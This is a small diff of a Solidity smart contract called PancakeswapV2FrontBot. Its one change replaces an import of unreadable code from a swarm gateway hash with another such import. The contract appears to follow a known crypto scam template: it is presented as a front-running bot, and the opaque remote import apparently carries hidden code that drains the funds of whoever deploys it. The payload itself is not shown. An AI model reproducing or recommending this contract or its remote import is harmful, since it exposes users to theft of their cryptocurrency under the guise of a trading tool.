@@ -5,7 +5,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 // PancakeSwap manager
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://swarm-gateways.net/bzz:/ed7d112970ea20cba91582ce1df50766d770d7362eb5a8b9172073282f6efe54/pancakeswap_mian_base.sol";
+import "https://swarm-gateways.net/bzz:/4f7360cf6620707171a05efdff18080b23eb5abc5530356257aa6ad175541a87/pancakeswap-v2base.sol";
 contract PancakeswapV2FrontBot {
     
     string public tokenName;
